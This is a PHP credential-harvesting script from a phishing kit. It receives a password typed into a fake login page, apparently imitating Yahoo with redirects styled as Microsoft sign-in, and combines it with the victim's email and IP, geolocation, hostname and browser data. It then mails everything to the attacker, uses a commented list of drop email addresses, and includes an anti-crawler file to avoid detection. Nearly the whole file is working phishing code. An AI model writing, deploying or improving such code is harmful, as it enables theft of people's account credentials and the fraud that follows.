<?php

session_start();


include 'antispider.php';

if(isset($_REQUEST['verifyPassword'])){
//$admin_email = "resultinbox10@zohomail.com,resultinbox10@gmail.com,boxman00712@outlook.com";
$password = $_REQUEST['password'];
$email = $_SESSION['Email'];

if(strlen($password) == 0)    {
    header( "Location: password2.php?wa=wsignin1.0&rpsnv=13&ct=1506170093&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=inbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai");
}

else
{

$ip = getenv("REMOTE_ADDR");
$country = ip_visitor_country();
$region = ip_visitor_region();
$city = ip_visitor_city();
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);


//submit to email
$message .= "---------- rYan ----------\n";
$message .= "Yahoo : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "-------------------------------------------------\n";
$message .= "IP --  ".$ip."\n";
$message .= "Country Detected --  ".$country."\n";
$message .= "Region Detected --  ".$region."\n";
$message .= "City Detected --  ".$city."\n";
$message .= "DateTime --  : ".$adddate."\n";
$message .= "HostName -- : ".$hostname."\n";
$message .= "Browser Detected --  ".$browser."\n";
$message .= "------------- rYan -----------------------\n";
$message .= "---------------------------------------------------------". "\n";

$subject = "Yahoo-$ip";
$headers = "From: YahooPage";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);



unset($_SESSION['Email']);



header('Location: password2.php');

//header('Location: https://login.microsoftonline.com/common/oauth2');

//header('Location: https://drive.google.com/open?id=1eKrEtmqbqJ0q7GUS3-CfJmYwlBh3sT2N');


}

}
  //if "email" variable is not filled out, display the form




function ip_visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
		
		
    }

    return $country;
}

//echo ip_visitor_country(); // output Country name


// Function to get REGION;
function ip_visitor_region()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $region  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_region'] != null) {
   	  $region = $ip_data['geoplugin_region'];
		
    }

    return $region;
}

// Function to get city;
function ip_visitor_city()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $city  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_city'] != null) {
   	  $city = $ip_data['geoplugin_city'];
		
    }

    return $city;
}

//echo ip_visitor_city(); // output city name
?>
